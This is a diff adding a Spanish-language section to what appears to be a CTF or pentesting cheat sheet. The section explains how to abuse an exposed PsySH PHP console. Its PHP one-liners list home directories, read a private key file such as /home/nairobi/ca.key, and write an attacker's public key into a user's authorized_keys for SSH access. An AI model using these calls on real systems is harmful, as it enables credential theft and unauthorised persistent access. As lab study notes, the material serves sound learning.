@@ -77,6 +77,37 @@ du -h root.txt
 df -h
 ```
 
+### Psy Shell v0.9.9
+
+ PsySH is a runtime developer console, interactive debugger and REPL for PHP. Algunas veces o mas bien siempre se tienen bloqueadas funciones de php que permiten ejecutar comandos y esto se puede ver con el phpinfo().
+
+ ![image](https://github.com/gecr07/Acordeon/assets/63270579/c0161dcb-5260-466a-9409-7df413162e04)
+
+Cuando tengas este escenario puedes leer y escribir archivos(si es que no esta bloqueado como arriba) de este modod puedes conseguir claves de ssh o bien meter tu autorized keys para poder conectarte con tu id_rsa. Los siguientes comandos son:
+
+```
+getcwd()
+
+get_current_user()
+
+system('echo test')
+
+scandir("/home")
+
+file_get_contents("/etc/os-release")
+
+echo file_get_contents("/home/nairobi/ca.key")
+
+To show env variables use the same var example
+
+show $tokyo
+
+file_put_contents('/home/dali/.ssh/authorized_keys', $publickey)
+
+
+```
+
+
 ## Probar limites
 
 Para probar limites y saber donde esta el limite como para los BoF usa los patrones.
